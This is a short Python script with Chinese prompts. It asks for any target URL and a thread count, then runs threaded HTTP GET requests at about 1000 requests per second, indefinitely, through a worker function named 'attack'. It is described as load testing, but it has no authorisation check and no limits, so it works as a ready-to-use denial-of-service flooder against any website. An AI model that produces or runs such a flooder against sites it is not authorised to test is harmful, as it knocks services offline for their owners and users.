import requests
import threading
import time

# 控制线程停止用
stop_event = threading.Event()

def attack(url, rate_per_thread):
    interval = 1 / rate_per_thread
    session = requests.Session()

    while not stop_event.is_set():
        start_time = time.time()
        try:
            response = session.get(url, timeout=5)
            print(f"[+] 成功: {response.status_code}")
        except Exception as e:
            print(f"[-] 失败: {e}")
        elapsed = time.time() - start_time
        sleep_time = max(0, interval - elapsed)
        time.sleep(sleep_time)

def main():
    url = input("请输入目标网址（例如：https://example.com）：").strip()
    try:
        total_threads = int(input("请输入线程数量（建议 10~200）：").strip())
    except ValueError:
        print("⚠️ 输入无效，默认使用 100 线程")
        total_threads = 100

    total_rps = 1000
    rate_per_thread = total_rps / total_threads

    print(f"\n🚀 正在压测：{url}")
    print(f"➡️ 线程数: {total_threads}")
    print(f"⚙️ 每线程速率: {rate_per_thread:.2f} req/sec")
    print(f"💥 总速率: {total_rps} req/sec（持续运行，按 Ctrl+C 停止）\n")

    threads = []
    for _ in range(total_threads):
        t = threading.Thread(target=attack, args=(url, rate_per_thread))
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n⛔ 停止中，请稍候...")
        stop_event.set()
        for t in threads:
            t.join()
        print("✅ 所有线程已安全退出。")

if __name__ == "__main__":
    main()